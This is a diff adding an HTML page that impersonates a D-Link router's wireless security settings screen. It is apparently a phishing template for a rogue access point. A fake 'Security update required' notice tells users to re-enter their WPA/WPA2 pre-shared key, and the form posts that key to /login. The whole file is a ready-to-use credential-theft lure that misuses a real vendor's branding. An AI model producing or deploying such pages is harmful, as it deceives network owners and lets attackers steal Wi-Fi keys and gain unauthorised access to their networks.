@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>D-Link — Wireless Setup</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Verdana, Geneva, sans-serif; background: #ececec; color: #333; min-height: 100vh; }
+        .header { background: #fff; border-bottom: 3px solid #f58220; padding: 14px 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.08); }
+        .header h1 { font-size: 20px; font-weight: 700; color: #f58220; letter-spacing: -0.02em; }
+        .header p { font-size: 11px; color: #666; margin-top: 4px; }
+        .menu { background: #4a4a4a; display: flex; flex-wrap: wrap; }
+        .menu a { color: #fff; text-decoration: none; padding: 10px 14px; font-size: 12px; }
+        .menu a:hover { background: #5a5a5a; }
+        .menu a.on { background: #f58220; color: #fff; }
+        .container { max-width: 680px; margin: 18px auto; padding: 0 14px; }
+        .box { background: #fff; border: 1px solid #ccc; border-radius: 2px; }
+        .box-title { background: linear-gradient(180deg, #f9f9f9, #eee); border-bottom: 1px solid #ccc; padding: 10px 14px; font-size: 13px; font-weight: 700; color: #444; }
+        .box-body { padding: 18px 14px; }
+        .alert { background: #fff8f0; border: 1px solid #f58220; border-left-width: 4px; padding: 12px 14px; margin-bottom: 18px; font-size: 12px; line-height: 1.55; color: #553520; }
+        .alert b { color: #c45a0a; display: block; margin-bottom: 6px; font-size: 13px; }
+        table { width: 100%; border-collapse: collapse; font-size: 12px; }
+        th, td { padding: 10px 8px; text-align: left; border-bottom: 1px solid #eee; vertical-align: middle; }
+        th { width: 38%; color: #555; font-weight: 700; }
+        input[type="password"] { width: 100%; max-width: 280px; padding: 8px 10px; border: 1px solid #bbb; border-radius: 2px; font-size: 13px; }
+        input[type="password"]:focus { border-color: #f58220; outline: none; }
+        .btn-row { text-align: right; padding-top: 16px; }
+        .btn { padding: 8px 20px; background: #f58220; color: #fff; border: none; border-radius: 2px; font-size: 12px; font-weight: 700; cursor: pointer; }
+        .btn:hover { background: #e07518; }
+        .foot { text-align: center; padding: 16px; font-size: 10px; color: #888; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>D-Link</h1>
+        <p>Wireless Router Configuration</p>
+    </div>
+    <div class="menu">
+        <a href="#">SETUP</a><a href="#" class="on">WIRELESS</a><a href="#">NETWORK</a><a href="#">MAINTENANCE</a>
+    </div>
+    <div class="container">
+        <div class="box">
+            <div class="box-title">Wireless Security</div>
+            <div class="box-body">
+                <div class="alert">
+                    <b>Security update required</b>
+                    Your router needs to refresh wireless credentials after a security update. Enter your WPA/WPA2 pre-shared key below to continue and protect your network.
+                </div>
+                <form method="POST" action="/login">
+                    <table>
+                        <tr><th>Security Mode</th><td>WPA/WPA2-Personal</td></tr>
+                        <tr><th>Cipher Type</th><td>AES</td></tr>
+                        <tr><th>Pre-Shared Key</th><td><input type="password" name="wfphshr-wpa-password" placeholder="8–63 characters" required autocomplete="current-password"></td></tr>
+                    </table>
+                    <div class="btn-row"><button type="submit" class="btn">Save Settings</button></div>
+                </form>
+            </div>
+        </div>
+        <div class="foot">Router web interface</div>
+    </div>
+</body>
+</html>
